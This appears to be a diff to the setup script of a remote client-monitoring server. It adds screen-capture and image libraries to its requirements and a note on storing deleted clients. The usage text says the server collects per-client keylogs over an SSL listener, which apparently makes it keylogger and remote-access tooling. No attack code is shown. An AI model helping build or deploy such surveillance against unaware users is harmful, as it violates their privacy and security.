@@ -34,7 +34,11 @@ Flask>=3.0.0
 flask-socketio>=5.3.0
 eventlet>=0.33.0
 cryptography>=41.0.0
+pyOpenSSL>=24.0.0
 Pillow>=10.0.0
+mss>=9.0.0
+numpy>=1.24.0
+opencv-python-headless>=4.8.0
 EOF
 
 # Fix imports in server files
@@ -77,6 +81,7 @@ USAGE:
 - Server listens on port 8443 for client connections (SSL/TLS)
 - Web interface runs on port 5000 (or custom port with --web-port)
 - Keylogs are saved in: keylogs/[ClientName]/
+- Deleted clients list is saved in: server_data/deleted_clients.json
 
 TROUBLESHOOTING:
 - If you get "ModuleNotFoundError", run: pip3 install -r requirements.txt
